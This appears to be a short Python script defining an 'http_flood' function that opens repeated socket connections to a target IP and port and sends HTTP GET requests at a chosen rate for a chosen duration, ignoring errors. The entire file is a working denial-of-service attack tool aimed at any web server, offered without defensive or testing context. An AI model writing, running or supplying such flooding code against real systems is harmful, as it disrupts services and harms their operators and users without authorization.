import socket
import time

def http_flood(target_ip, target_port, duration, rate):
    """
    Sends HTTP GET requests to a target at a specified rate for a given duration.
    """
    print(f"[INFO] Starting HTTP flood on {target_ip}:{target_port} for {duration}s at ~{rate} req/s.")
    start_time = time.time()
    request_count = 0

    while True:
        if time.time() - start_time > duration:
            break
        
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target_ip, target_port))
            http_request = f"GET / HTTP/1.1\r\nHost: {target_ip}\r\nConnection: close\r\n\r\n"
            s.send(http_request.encode())
            s.close()
            request_count += 1
        except:
            pass

        time.sleep(1 / rate)

    print(f"[INFO] HTTP flood completed. Total requests sent: {request_count}")
